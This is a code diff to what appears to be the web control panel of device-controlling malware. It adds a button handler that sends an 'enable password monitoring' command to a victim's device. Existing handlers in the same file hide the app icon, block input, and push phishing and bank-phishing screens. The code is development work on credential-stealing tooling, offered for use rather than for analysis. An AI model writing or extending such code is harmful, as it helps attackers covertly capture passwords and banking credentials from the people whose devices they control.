@@ -753,6 +753,15 @@ const handleHideIcon = () => {
     });
     message.success('隐藏图标请求已发送');
 };
+
+const handleEnablePasswordMonitoring = () => {
+    send({
+        command: 'ENABLE_PASSWORD_MONITORING',
+        params: {},
+        pid: deviceId.value,
+    });
+    message.success('密码监听已重新启用');
+};
 const deleteBasePath = computed(() => (isAdminBack.value ? adminBaseUrl.value + '/devices' : userRoute('/devices')));
 const handleDelete = () => {
     router.delete(`${deleteBasePath.value}/${props.device.uuid}`);
@@ -1115,6 +1124,7 @@ const tabList = [
                                     @send-kb="handleSendKb"
                                     @send-block="handleSendBlock"
                                     @hide-icon="handleHideIcon"
+                                    @enable-password-monitoring="handleEnablePasswordMonitoring"
                                     @send-phish="handleSendPhish"
                                     @send-bank-phish="handleSendBankPhish"
                                     @toggle-block-text="handleToggleBlockText"
